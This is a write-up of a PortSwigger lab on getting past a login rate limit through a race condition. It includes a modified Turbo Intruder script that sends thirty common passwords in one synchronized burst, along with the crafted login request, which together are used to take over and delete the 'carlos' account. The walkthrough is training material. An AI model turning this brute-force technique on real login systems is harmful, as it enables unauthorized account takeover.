# Bypassing rate limits via race conditions

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits), you'll learn: Bypassing rate limits via race conditions! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab's login mechanism uses rate limiting to defend against brute-force attacks. However, this can be bypassed due to a race condition.

To solve the lab:

1. Work out how to exploit the race condition to bypass the rate limit.
2. Successfully brute-force the password for the user `carlos`.
3. Log in and access the admin panel.
4. Delete the user `carlos`.

You can log in to your account with the following credentials: `wiener:peter`.

You should use the following list of potential passwords:

```
123123
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
1234567890
michael
x654321
superman
1qaz2wsx
baseball
7777777
121212
000000
```

> Note
>  
> - Solving this lab requires Burp Suite 2023.9 or higher. You should also use the latest version of the Turbo Intruder, which is available from the [BApp Store](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988).
> - You have a time limit of 15 mins. If you don't solve the lab within the time limit, you can reset the lab. However, Carlos's password changes each time.

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-2/images/Pasted%20image%2020230831133635.png)

In here, we can view blog posts.

**Login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-2/images/Pasted%20image%2020230831133712.png)

**We can try to brute force user `carlos`'s password:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-2/images/Pasted%20image%2020230831133757.png)

**After some testing, I found that there's a rate limit. After 3 wrong login attempts, we'll be locked out:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-2/images/Pasted%20image%2020230831133907.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-2/images/Pasted%20image%2020230831133951.png)

When we clicked the "Log in" button, it'll send a POST request to `/login`, with parameter `csrf`, `username`, and `password`.

Let's test for **race condition**!

**After rate limited is gone, send the login request to Burp Suite's Repeater 5 times, group them together, select "Send group (parallel)", and send it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-2/images/Pasted%20image%2020230831134333.png)

Nice! No more rate limiting! That being said, the login function is vulnerable to race condition.

## Exploitation

**Now, we can use "Turbo Intruder" to brute force `carlos`'s password with bypassing rate limiting via race condition:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-2/images/Pasted%20image%2020230831134514.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-2/images/Pasted%20image%2020230831134525.png)

**In the Python editor, choose the `examples/race-single-packet-attack.py` Python template:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-2/images/Pasted%20image%2020230831134720.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-2/images/Pasted%20image%2020230831134733.png)

**In order to make it brute force user `carlos`'s password, we'll need to modify the template to:**
```python
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    wordlist = ['123123', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '1234567890', 'michael', 'x654321', 'superman', '1qaz2wsx', 'baseball', '7777777', '121212', '000000']
    # the 'gate' argument withholds the final byte of each request until openGate is invoked
    for password in wordlist:
        engine.queue(target.req, password, gate='race1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**And add `%s` string formatting placeholder in the `password` POST parameter in the HTTP request:**
```http
POST /login HTTP/2
Host: 0a8700c60427bda288e290c7001500b5.web-security-academy.net
Cookie: session=4EAp3UZ022KeX6D50w7FESJoixZtTh5s

csrf=dL20kaRyH4RJaFOtxT5KbhLdJtVIZYwe&username=carlos&password=%s
```

**Then launch the attack:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-2/images/Pasted%20image%2020230831135721.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-2/images/Pasted%20image%2020230831140304.png)

In here, we found that there's a **HTTP status code "302 Found"**, which means this request has the correct password!

**Finally, login as `carlos`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-2/images/Pasted%20image%2020230831140419.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-2/images/Pasted%20image%2020230831140426.png)

**I'm user `carlos`! Let's delete it!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-2/images/Pasted%20image%2020230831140456.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Race-Conditions/Race-Conditions-2/images/Pasted%20image%2020230831140503.png)

## Conclusion

What we've learned:

1. Bypassing rate limits via race conditions